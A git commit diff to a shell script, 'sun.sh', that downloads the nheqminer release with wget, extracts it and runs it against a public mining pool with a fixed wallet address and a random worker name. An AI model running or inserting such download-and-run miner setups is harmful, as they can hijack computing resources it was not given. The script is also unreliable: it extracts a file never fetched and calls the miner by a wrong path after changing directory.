470c8ca0aef057b2ddaad0216c39eccd3a95764f
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-26 16:26:18 +0700

    Update sun.sh

--- sun.sh
+++ sun.sh
@@ -3,6 +3,11 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvf nheqminer-Linux-v0.8.2.tg2
-tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
+
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+
+cd nheqminer
+
 nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1_9999 -n 1)sty) -p x -t 4
